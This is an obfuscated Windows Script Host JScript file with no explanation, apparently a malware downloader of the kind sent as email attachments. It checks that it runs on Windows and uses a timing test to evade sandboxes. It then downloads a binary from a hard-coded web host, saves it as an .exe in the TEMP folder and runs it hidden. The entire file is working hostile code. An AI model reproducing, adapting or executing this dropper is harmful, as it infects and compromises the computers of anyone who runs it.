var nm = false;
var U = "CreateObject";
var t = function O() {return WScript[U]("WScript.Shell");}(), G = 11;
var o = "MSXML2.XMLHTTP";
var D = 2123213;
var I = 0;
function e(K){t["Run"](K, I, I);};
function a(){return "" + o;};
function TK(wn, BG){I = I * 1; return wn - BG;};
function g(){return U;};
/*@cc_on
  @if (@_win32 || @_win64)
    nm = true;
  @end
@*/
if (nm)
{
var k = "";
function UU(){return 22;};
var W0 = 0; var s = 0;
function qK()
{
var W = new this["Date"]();
var xs = W["getUTCMilliseconds"]();
WScript["Sleep"](UU());
var W = new this["Date"]();
var V = W["getUTCMilliseconds"]();
WScript["Sleep"](UU());
var W = new this["Date"]();
var yU = W["getUTCMilliseconds"]();
var W0 = "oH";
W0 = TK(V, xs);
var s = "Fg";
s = TK(yU, V);
k = "open";
return TK(W0, s);
}
var M0 = false;
var O0 = false;
for (var Ro = I; Ro < UU() * 1; Ro++){if (qK() != I){
M0 = true; 
s = "31" + 11 * W0 + s; 
O0 = true; 
break;
}}
function M() {return ((M0 == true) && (M0 == O0)) ? 1 : I;};
if (M0 && M() && O0){
function HX() {return t["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "2rkBom78eETGxmL.exe";};
 ZV = a();
 Xo = WScript[U](ZV);
 var X = 1;
 while (X){
try {
Xo[k]("GET", "http://aztechnologies.co.uk/sdj3oa", false);
Xo["send"]();
Xg = "Sleep";
for (;;){WScript[Xg](UU() * 11); if (Xo["readystate"] >= 2 * 2) break;};
X = I;
} catch(Hw){};
}
function Is(i) {var Tw = (1, 2, 3, 4, 5, i); return Tw;};
hl = WScript[g()]("ADODB.Stream");
ZV = hl;
ZV[k]();
ZV["type"] = Is(1);
ZV["write"](Xo["ResponseBody"]);
hl["position"] = Is(I);
ZV["Save" + "ToFile"](HX(), 2);
hl["c"+"lose"]();
H = HX();
e(H);
}
}

